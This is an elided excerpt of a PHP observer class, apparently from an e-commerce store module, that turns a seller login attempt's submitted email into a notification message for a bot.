...
class SellerLoginObserver implements ObserverInterface
{
    ...
    public function execute(Observer $observer)
    {
        try {
            ...
            $email = $request->getPost('login')['username'];

            $message = sprintf(
                "Seller Login Attempt:\n\nEmail: %s",
                $email
            );

            $data = ['content' => $message, 'username' => 'Seller Login Bot'];
            ...
            $this->logger->error('Error in SellerLoginObserver: ' . $e->getMessage());
        }
    }
}
